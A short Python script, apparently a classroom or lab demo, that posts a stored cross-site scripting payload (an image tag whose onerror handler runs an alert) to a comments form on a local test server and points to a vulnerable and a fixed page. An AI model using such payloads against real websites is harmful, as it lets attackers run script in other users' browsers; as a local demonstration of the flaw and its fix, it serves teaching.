import requests

payload = '<img src="/missing-image" onerror="alert(`stored XSS`)">'
response = requests.post(
    "http://127.0.0.1:5000/comments",
    data={"body": payload},
    allow_redirects=False,
)

print("Stored payload:", response.status_code)
print("Vulnerable page: http://127.0.0.1:5000/vuln")
print("Fixed page:      http://127.0.0.1:5000/fixed")
